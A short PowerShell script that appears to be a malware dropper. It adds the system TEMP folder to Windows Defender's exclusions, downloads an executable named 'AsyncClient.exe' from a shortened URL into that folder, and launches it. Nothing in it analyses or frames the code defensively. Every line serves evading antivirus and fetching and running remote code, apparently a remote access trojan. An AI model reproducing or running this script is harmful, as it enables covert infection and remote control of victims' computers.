# Set the exclusion path to the system's temporary folder
Add-MpPreference -ExclusionPath $env:TEMP

# Define the URL of the file to download
$url = 'https://tinyurl.com/3yhak4wk'

# Set the output path to the temporary folder
$outputFile = [System.IO.Path]::Combine($env:TEMP, 'AsyncClient.exe')

# Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
Start-Sleep -Milliseconds 100

# Create a WebClient object to download the file
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $outputFile)

# Run the downloaded file after the download is complete
Start-Process -FilePath $outputFile
